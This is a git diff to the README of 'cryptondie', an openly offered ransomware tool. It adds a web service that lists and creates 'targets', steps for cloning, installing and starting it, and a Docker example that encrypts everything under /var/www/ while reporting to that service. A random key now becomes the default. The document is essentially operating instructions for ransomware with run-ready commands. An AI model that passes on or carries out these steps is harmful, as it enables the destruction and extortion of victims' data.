@@ -16,7 +16,7 @@
 ### Options
 
 ```text
-    --key       key used to encrypt and decrypt files - key size (16 bytes)
+    --key       key used to encrypt and decrypt files, default is random string(recommended)
     --dir       Home directory for the attack, default is /
     --encrypt   Encrypt all files
     --decrypt   Decrypt all files
@@ -27,12 +27,43 @@ Example:
 
 ```
 
+### Web service endpoints
+
+```
+GET   - /targets              - list all targets (returns in JSON format)
+GET   - /targets/<target_id>  - list one target by id (returns in JSON format)
+POST  - /target/<target_id>   - create new target
+```
+
+<hr>
+
+## how to run this shit?
+
+### Clonning repository
+
+```
+git clone https://github.com/zer0dx/cryptondie
+```
+
+### Install requirements
+
+```
+pip3 install -r requirements.txt
+```
+
+### Running web service
+
+```
+cd cryptondie/discovery
+python3 service_discovery.py
+```
+
 ### Running in Docker
 
 ```bash
 docker build -t cryptondie .
 docker run -it cryptondie /bin/bash
-python cryptondie.py --dir /var/www/ --key 0123456789abcdef --encrypt --verbose
+python cryptondie.py --web-service http://127.0.0.1:5000 --dir /var/www/ --encrypt --verbose
 ```
 
 ### which encryption is implemented?
